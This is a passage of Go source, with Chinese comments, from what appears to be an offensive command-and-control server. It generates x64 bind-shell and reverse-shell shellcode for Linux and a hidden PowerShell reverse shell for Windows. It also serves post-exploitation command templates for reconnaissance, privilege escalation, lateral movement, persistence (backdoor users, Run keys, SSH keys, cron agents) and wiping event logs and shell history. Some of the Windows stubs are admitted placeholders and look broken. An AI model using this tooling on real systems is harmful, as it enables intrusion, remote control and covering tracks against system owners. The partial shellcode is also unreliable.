	// mov rsi, rsp; xor rdx, rdx; mov dl, 16
	sc = append(sc, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xd2, 0xb2, 0x10)
	// xor rax, rax; mov al, 49 (bind)
	sc = append(sc, 0x48, 0x31, 0xc0, 0xb0, 0x31, 0x0f, 0x05)
	// 3. listen(sock, 1): xor rsi, rsi; inc rsi; mov al, 50
	sc = append(sc, 0x48, 0x31, 0xf6, 0xb8, 0x32, 0x00, 0x00, 0x00, 0x0f, 0x05)
	// 4. accept(sock, NULL, NULL): xor rsi, rsi; xor rdx, rdx; mov al, 43
	sc = append(sc, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb8, 0x2b, 0x00, 0x00, 0x00, 0x0f, 0x05)
	// mov rdi, rax (client fd → rdi)
	sc = append(sc, 0x48, 0x89, 0xc7)
	// 5. dup2(client, 0/1/2)
	for fd := 0; fd <= 2; fd++ {
		sc = append(sc, 0x48, 0x31, 0xc0, 0xb0, 0x21)
		if fd == 0 {
			sc = append(sc, 0x48, 0x31, 0xf6)
		} else if fd == 1 {
			sc = append(sc, 0x6a, 0x01, 0x5e)
		} else {
			sc = append(sc, 0x6a, 0x02, 0x5e)
		}
		sc = append(sc, 0x0f, 0x05)
	}
	// 6. execve("/bin/sh", NULL, NULL)
	sc = append(sc,
		0x48, 0x31, 0xd2, // xor rdx, rdx
		0x52,              // push rdx
		0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // mov rbx, "/bin/sh\0"
		0x53,              // push rbx
		0x48, 0x89, 0xe7, // mov rdi, rsp
		0x48, 0x31, 0xf6, // xor rsi, rsi
		0x48, 0x31, 0xc0, // xor rax, rax
		0xb0, 0x3b, // mov al, 59
		0x0f, 0x05, // syscall
	)
	return sc
}

// genLinuxExecveShellcode 生成 Linux x64 execve shellcode
func genLinuxExecveShellcode(cmd string) []byte {
	// 简化版: execve("/bin/sh", ["/bin/sh","-c",cmd], NULL)
	// 实际实现需要汇编，这里返回预置模板
	return []byte{
		0x48, 0x31, 0xd2, // xor rdx, rdx
		0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // mov rbx, "/bin/sh"
		0x53, // push rbx
		0x48, 0x89, 0xe7, // mov rdi, rsp
		0x52, // push rdx
		0x57, // push rdi
		0x48, 0x89, 0xe6, // mov rsi, rsp
		0x48, 0x31, 0xc0, // xor rax, rax
		0xb0, 0x3b, // mov al, 59 (execve)
		0x0f, 0x05, // syscall
	}
}

// genWindowsWinexecShellcode 生成 Windows x64 WinExec shellcode
func genWindowsWinexecShellcode(cmd string) []byte {
	// 简化版: 返回占位 shellcode
	return []byte{
		0x48, 0x83, 0xec, 0x28, // sub rsp, 0x28
		0x48, 0x31, 0xc9, // xor rcx, rcx
		0x48, 0x8d, 0x15, 0x35, 0x00, 0x00, 0x00, // lea rdx, [rip+0x35]
		0xff, 0xd0, // call rax
		0x48, 0x83, 0xc4, 0x28, // add rsp, 0x28
		0xc3, // ret
	}
}

// genLinuxReverseShellcode 生成 Linux x64 反向 shell shellcode
// 流程: socket(2,1,0) → connect → dup2(0/1/2) → execve("/bin/sh")
// 参数: lhost (点分十进制 IP), lport (端口号)
func genLinuxReverseShellcode(lhost string, lport int) []byte {
	ip := net.ParseIP(lhost)
	if ip == nil || len(ip.To4()) != 4 {
		ip = net.IPv4(127, 0, 0, 1)
	} else {
		ip = ip.To4()
	}
	ipVal := binary.BigEndian.Uint32(ip) // 网络字节序
	portVal := uint16(lport)
	if portVal == 0 {
		portVal = 4444
	}

	// 构建 sockaddr_in 结构: {AF_INET=2, port, ip, padding=0}
	// 栈上构造: push ip(4B) + push word(port) + push word(AF_INET)
	var sc []byte
	// 1. socket(AF_INET=2, SOCK_STREAM=1, 0)
	sc = append(sc,
		0x48, 0x31, 0xff, // xor rdi, rdi
		0x48, 0x31, 0xf6, // xor rsi, rsi
		0x48, 0x31, 0xd2, // xor rdx, rdx
		0xb8, 0x29, 0x00, 0x00, 0x00, // mov eax, 41 (socket)
		0x0f, 0x05, // syscall
		0x48, 0x89, 0xc7, // mov rdi, rax (sock fd → rdi)
	)
	// 2. connect(sock, &sockaddr, 16)
	// 在栈上构造 sockaddr_in (16 字节): family(2) + port(2) + ip(4) + zero(8)
	// sub rsp, 16
	sc = append(sc, 0x48, 0x83, 0xec, 0x10)
	// xor rax, rax; mov [rsp+8], rax (sin_zero = 0)
	sc = append(sc, 0x48, 0x31, 0xc0)
	sc = append(sc, 0x48, 0x89, 0x44, 0x24, 0x08)
	// mov dword [rsp+4], ipVal (sin_addr, 网络字节序)
	sc = append(sc, 0xc7, 0x44, 0x24, 0x04)
	sc = appendBinaryUint32(sc, ipVal)
	// mov word [rsp+2], portVal (sin_port, 网络字节序)
	sc = append(sc, 0x66, 0xc7, 0x44, 0x24, 0x02)
	sc = appendBinaryUint16(sc, portVal)
	// mov word [rsp], 2 (sin_family = AF_INET)
	sc = append(sc, 0x66, 0xc7, 0x04, 0x24, 0x02, 0x00)
	// mov rsi, rsp (rsi = &sockaddr)
	sc = append(sc, 0x48, 0x89, 0xe6)
	// xor rdx, rdx; mov dl, 16 (sizeof sockaddr)
	sc = append(sc, 0x48, 0x31, 0xd2, 0xb2, 0x10)
	// xor rax, rax; mov al, 42 (connect)
	sc = append(sc, 0x48, 0x31, 0xc0, 0xb0, 0x2a)
	// syscall
	sc = append(sc, 0x0f, 0x05)
	// 3. dup2(sock, 0/1/2) - 展开循环避免跳转偏移计算
	for fd := 0; fd <= 2; fd++ {
		sc = append(sc,
			0x48, 0x31, 0xc0, // xor rax, rax
			0xb0, 0x21, // mov al, 33 (dup2)
		)
		if fd == 0 {
			sc = append(sc, 0x48, 0x31, 0xf6) // xor rsi, rsi (rsi=0)
		} else if fd == 1 {
			sc = append(sc, 0x6a, 0x01, 0x5e) // push 1; pop rsi (rsi=1)
		} else {
			sc = append(sc, 0x6a, 0x02, 0x5e) // push 2; pop rsi (rsi=2)
		}
		sc = append(sc, 0x0f, 0x05) // syscall
	}
	// 4. execve("/bin/sh", NULL, NULL)
	sc = append(sc,
		0x48, 0x31, 0xd2, // xor rdx, rdx
		0x52,              // push rdx (NULL terminator)
		0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, // mov rbx, "/bin/sh\0"
		0x53,              // push rbx
		0x48, 0x89, 0xe7, // mov rdi, rsp (rdi = "/bin/sh")
		0x48, 0x31, 0xf6, // xor rsi, rsi (rsi = NULL)
		0x48, 0x31, 0xc0, // xor rax, rax
		0xb0, 0x3b, // mov al, 59 (execve)
		0x0f, 0x05, // syscall
	)
	return sc
}

// genWindowsReverseShellcode 生成 Windows x64 反向 shell shellcode
// 使用 WinExec 执行 powershell 反弹命令（简化实现，避免复杂的 PEB 遍历）
// 注意: 此 shellcode 假设 rax 指向 WinExec（需通过 loader 注入），生产环境建议使用 MSF 生成
func genWindowsReverseShellcode(lhost string, lport int) []byte {
	if lport == 0 {
		lport = 4444
	}
	// 构造 powershell 反弹命令
	cmd := fmt.Sprintf("$c=New-Object Net.Sockets.TCPClient('%s',%d);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -gt 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$s.Write(([Text.ASCIIEncoding]::GetBytes($o)),0,$o.Length)}", lhost, lport)
	fullCmd := "powershell -WindowStyle Hidden -Command \"" + cmd + "\""

	// 生成 shellcode: 将命令字符串放在 shellcode 末尾，通过 call/pop 获取地址
	// 结构: [jmp to call] [pop rax] [push cmd_string] [call WinExec] [cmd_string]
	// 简化版: 直接返回命令字符串的 shellcode loader
	var sc []byte
	// sub rsp, 0x28 (shadow space)
	sc = append(sc, 0x48, 0x83, 0xec, 0x28)
	// call +0 (call 下一条指令，用于获取 RIP)
	sc = append(sc, 0xe8, 0x00, 0x00, 0x00, 0x00)
	// pop rax (rax = 当前 RIP，即 cmd 字符串地址的前方)
	sc = append(sc, 0x58)
	// lea rcx, [rax + offset] (rcx = cmd 字符串地址)
	// offset = 后续指令长度
	leaOffset := uint32(12) // mov rdx, 1; call rax; add rsp, 0x28; ret
	sc = append(sc, 0x48, 0x8d, 0x88)
	sc = appendBinaryUint32(sc, leaOffset)
	// mov rdx, 1 (SW_SHOW)
	sc = append(sc, 0x48, 0xc7, 0xc2, 0x01, 0x00, 0x00, 0x00)
	// call rax (WinExec)
	sc = append(sc, 0xff, 0xd0)
	// add rsp, 0x28
	sc = append(sc, 0x48, 0x83, 0xc4, 0x28)
	// ret
	sc = append(sc, 0xc3)
	// 命令字符串 (null terminated)
	sc = append(sc, []byte(fullCmd)...)
	sc = append(sc, 0x00)
	return sc
}

// appendBinaryUint32 将 uint32 以小端字节序追加到 slice
func appendBinaryUint32(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

// appendBinaryUint16 将 uint16 以小端字节序追加到 slice
func appendBinaryUint16(b []byte, v uint16) []byte {
	return append(b, byte(v), byte(v>>8))
}

// ============ 命令生成器 API ============

func handleCommandTemplates(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	templates := map[string]interface{}{
		"windows": map[string][]map[string]string{
			"信息收集": {
				{"name": "系统信息", "cmd": "systeminfo"},
				{"name": "网络配置", "cmd": "ipconfig /all"},
				{"name": "用户列表", "cmd": "net user"},
				{"name": "进程列表", "cmd": "tasklist"},
				{"name": "服务列表", "cmd": "sc query"},
				{"name": "端口连接", "cmd": "netstat -ano"},
				{"name": "补丁列表", "cmd": "wmic qfe list"},
				{"name": "共享列表", "cmd": "net share"},
			},
			"权限提升": {
				{"name": "当前权限", "cmd": "whoami /all"},
				{"name": "系统令牌", "cmd": "whoami /priv"},
				{"name": "可写目录", "cmd": "icacls C:\\Windows\\Temp"},
			},
			"横向移动": {
				{"name": "域信息", "cmd": "net view /domain"},
				{"name": "域用户", "cmd": "net user /domain"},
				{"name": "域控列表", "cmd": "nltest /dclist:domain"},
			},
			"持久化": {
				{"name": "添加用户", "cmd": "net user hacker P@ss123 /add"},
				{"name": "注册表自启", "cmd": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d cmd.exe"},
			},
			"清理痕迹": {
				{"name": "清除日志", "cmd": "wevtutil cl System"},
				{"name": "清除安全日志", "cmd": "wevtutil cl Security"},
			},
		},
		"linux": map[string][]map[string]string{
			"信息收集": {
				{"name": "系统信息", "cmd": "uname -a"},
				{"name": "用户信息", "cmd": "id"},
				{"name": "进程列表", "cmd": "ps aux"},
				{"name": "网络连接", "cmd": "ss -tlnp"},
				{"name": "定时任务", "cmd": "crontab -l"},
				{"name": "SUID文件", "cmd": "find / -perm -4000 -type f 2>/dev/null"},
			},
			"权限提升": {
				{"name": "Sudo权限", "cmd": "sudo -l"},
				{"name": "可写文件", "cmd": "find / -writable -type f 2>/dev/null"},
			},
			"持久化": {
				{"name": "SSH密钥", "cmd": "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"},
				{"name": "Crontab", "cmd": "(crontab -l;echo '*/5 * * * * /tmp/agent')|crontab -"},
			},
			"清理痕迹": {
				{"name": "清空历史", "cmd": "history -c && rm -f ~/.bash_history"},
			},
		},
	}
	jsonOK(w, templates)
}

// ============ 辅助函数 ============

// copyFile 复制文件
func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0644)
}

// fileSize 获取文件大小
func fileSize(path string) int64 {
	info, err := os.Stat(path)
	if err != nil {
		return 0
	}
	return info.Size()
}

// projectRoot 项目根目录（main.go 中设置）
var projectRoot string

// PayloadIconUpload Placeholder for icon upload
func handlePayloadIconUpload(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	jsonOK(w, map[string]interface{}{"success": true, "message": "icon upload not supported in Go version"})
}

// ensure imports are used
var _ = json.Marshal
